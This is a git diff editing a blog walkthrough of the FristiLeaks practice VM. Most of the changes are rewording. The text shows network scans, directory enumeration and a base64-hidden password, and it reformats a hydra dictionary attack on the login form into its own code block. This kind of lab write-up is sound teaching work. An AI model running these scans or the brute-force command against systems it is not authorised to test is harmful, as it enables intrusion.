@@ -9,7 +9,7 @@ layout: single
 classes: wide  
 ---
 
-I started out by finding the IP address of the target's machine. This can be done with `netdiscover`, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address. I used the `-r` option to scan for a limited range in which I know the IP address will be, which saves time.
+I started out by finding the IP address of the target's machine. This can be done with `netdiscover`, which shows the IP address along with a MAC address. Since I already knew the MAC address (shown in VirtualBox), this could be easily matched with the right IP address.
 
 ```bash
 kali@kali:~$ sudo netdiscover -r 192.168.56.0/16
@@ -25,7 +25,7 @@ Currently scanning: 192.168.69.0/16   |   Screen View: Unique Hosts
  192.168.56.113  08:00:27:a5:a6:76      1      60  PCS Systemtechnik GmbH                                                                                              
 ```
 
-I then ran an nmap scan against the target's IP address `192.168.56.113` to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose with relatively quick but useful results. I saved the output in a file because I don’t like to do multiple scans unless I absolutely have to (such as when I need different `nmap` options to fit a very specific purpose).
+I then ran an `nmap` scan against the target's IP address `192.168.56.113` to find out more about the target. I used the `-sS`, `-A`, `-n` and `-oA` options because in my opinion these serve a good general purpose while remaining accurate. I saved the output to a file so I can go back to it later instead of having to do multiple scans (saving time).
 
 ```bash
 kali@kali:~$ sudo nmap -sS -A -n -oA fristileaks 192.168.56.113
@@ -57,7 +57,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 21.89 seconds
 ```
 
-This was definitely a web based challenge, so after not finding any useful exploits for the Apache version (as expected) I visited the target's website. Nothing interesting on the front page (or in its source), so I gave the three disallowed paths from the `nmap` output a try. Nothing there either, except 'hints' that these weren't the pages I'm looking for. I decided to run `dirb` in order to find other pages/paths that might be useful:
+This was definitely a web based challenge, so after not finding any useful exploits for the `Apache` version (as expected) I visited the target's website. Nothing interesting on the front page (or in its source), so I gave the three disallowed paths from the `nmap` output a try. Nothing there either, except 'hints' that these weren't the pages I'm looking for. I decided to run `dirb` in order to find other pages/paths that might be useful:
 
 ```bash
 kali@kali:~$ dirb http://192.168.56.113
@@ -123,11 +123,13 @@ kali@kali:~$ nikto -h 192.168.56.113
 + 1 host(s) tested
 ```
 
-After a lot of thinking and staring at the output I had so far, I grew more and more convinced that there had to be a path that I was missing. After all, `dirb` only scans for paths based on the wordlist you give it. In this case, I used the default wordlist which returned no matches. I tried again with a few different wordlists, but still no success. The only conclusion I could come up with is that I'd have to manually try some pathnames based on the information the website was already giving me. As simple as things can be sometimes, `fristi` was what I was looking for:
+After a lot of thinking and staring at the output I had so far, I grew more and more convinced that there had to be a path that I was missing. After all, `dirb` only scans for paths based on the wordlist you give it. In this case, I used the default wordlist which returned no matches. I tried again with a few different wordlists, but still no success.
+
+The only conclusion I could come up with is that I'd have to manually try some paths based on the information the website was already giving me. As simple as things can be sometimes, `fristi` turned out to be what I was looking for:
 
 ![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_login.png)
 
-The username and password fields did not seem SQL injectable at first sight, so I took a look at the page source. Some notes were left here about the way the website stores images by `base64` encoding them. I noticed the `base64` encoding of a second image (?) although the page only displayed one image. I went ahead and decoded that and got the following:
+The username and password fields did not seem SQL injectable, so I took a look at the page source. Some notes were left here about the way the website stores images by `base64` encoding them. I noticed the `base64` encoding of a second image (?) although the page only displayed one image. I went ahead and decoded that and got the following:
 
 ```bash
 kali@kali:~$ nano b64.txt
@@ -155,9 +157,17 @@ Given that the notes from earlier mentioned how this way of encoding is used for
 
 ![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_decodedpic.png)
 
-This seemed like it could work as a password in the login form I found earlier. Now I only had to find the username, which turned out harder than I thought.
+This seemed like it could work as a password in the login form I found earlier. Now I only had to find the username, which turned out to be harder than I thought.
 
-I tried the usual ones like `admin`, `root`, `user`, etc. but no luck. I then even ran a bruteforce attempt on the login form using `hydra -L usernames.txt -p keKkeKKeKKeKkEkkEk 192.168.56.113 http-post-form '/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^:S=Wrong' -w 5 -W 1 -vV` but no matches found. This lead me to believe that the info I needed, again, would be hidden in plain sight somewhere. I took another look at the login form's page source and I noticed the name `eezeepz`. I gave that a try and sure enough, I was in:
+I tried the usual ones like `admin`, `root` and `user` but no luck. I then even ran a dictionary attack on the login form using the following command:
+
+```bash
+hydra -L usernames.txt -p keKkeKKeKKeKkEkkEk 192.168.56.113 http-post-form '/fristi/checklogin.php:myusername=^USER^&mypassword=^PASS^:S=Wrong' -w 5 -W 1 -vV
+```
+
+... but no matches found.
+
+This lead me to believe that the info I needed, again, would be hidden in plain sight somewhere. I took another look at the login form's page source and I noticed the name `eezeepz`. I gave that a try and sure enough, I was in:
 
 ![alt]({{ site.url }}{{ site.baseurl }}/images/fristileaks_loggedin.png)
 
@@ -291,7 +301,7 @@ whoami
 fristigod
 ```
 
-Still no root privileges, but at this point I had to be close. Turned out that I was:
+Still no `root` privileges, but at this point I had to be close. Turned out that I was:
 
 ```sh
 bash-4.1$ sudo -l
